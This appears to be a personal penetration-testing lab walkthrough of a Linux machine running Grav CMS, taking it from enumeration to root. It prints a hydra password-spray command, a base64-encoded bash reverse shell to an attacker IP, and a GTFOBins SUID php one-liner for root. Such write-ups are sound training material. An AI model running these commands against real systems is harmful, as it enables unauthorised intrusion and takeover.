---
Status: Done
OS: Linux
Difficulty: Easy
tags:
  - SUID
  - GravCMS
Date: 2026-07-19T15:07:00
Owned: 2026-07-20T02:32:00
---

---
# Enumeration
## port scan
rust scan  
![[Pasted image 20260719150913.png]]
nmap scan with -sV -sC  
![[Pasted image 20260719151226.png]]

## port80
![[Pasted image 20260719150946.png]]
grav  
![[Pasted image 20260719151032.png]]
let's search for exploit  
![[Pasted image 20260719151125.png]]
how do we check version-- idk  
![[Pasted image 20260719151520.png]]
it need authentication  
look for default cred both on google and list  
```
grep -ri "grav" /usr/share/wordlists/seclists/Passwords/Default-Credentials
```
nothing found  
![[Pasted image 20260719152634.png]]

let's spray for cred first  
![[Pasted image 20260719152034.png]]
field required
```sh
hydra -l admin -P passwords.txt 192.168.163.12 http-post-form '/grav-admin/login:username=^USER^&password=^PASS^:failed'
```
wahhh  
![[Pasted image 20260719152220.png]]

## dir enum
feroxbuster with wordlist /dirb/common.txt
![[Pasted image 20260719201611.png]]

also found another login on /grav-admin/admin/  
![[Pasted image 20260719202327.png]]

also found path for license  
![[Pasted image 20260719202514.png]]
no useful info though  

# Exploit
turn out I don't even need cred or even grav version  

![[Pasted image 20260720020402.png]]
this one is unauth write  
![[Pasted image 20260720020606.png]]
it generate reverse shell  
edit the ip  
![[Pasted image 20260720020952.png]]
run got this error  
![[Pasted image 20260720021111.png]]
need to replace the base64 strings, not the comment that was instruction  
![[Pasted image 20260720021516.png]]
edit the script  
```txt
echo -ne "bash -i >& /dev/tcp/192.168.45.156/4444 0>&1" | base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE1Ni80NDQ0IDA+JjE=
```
![[Pasted image 20260720021505.png]]
rerun the script this time no error  
look at our netcat listener we got shell  
![[Pasted image 20260720021625.png]]
for this machine there is only 1 flag  

# Privilege Escalation
search for SUID binaries
```
find / -perm -u=s -type f 2>/dev/null
```
![[Pasted image 20260720022059.png]]

php7.4 check out GTFOBins try out each one for privesc SUID  
![[Pasted image 20260720022907.png]]
last one works  
```
/usr/bin/php7.4 -r 'pcntl_exec("/bin/sh", ["-p"]);'
```
![[Pasted image 20260720022826.png]]
got root  
![[Pasted image 20260720023111.png]]

# Lesson Learned 
Try the most doable exploit first, why go for authenticated when there is exploit with unauth...  
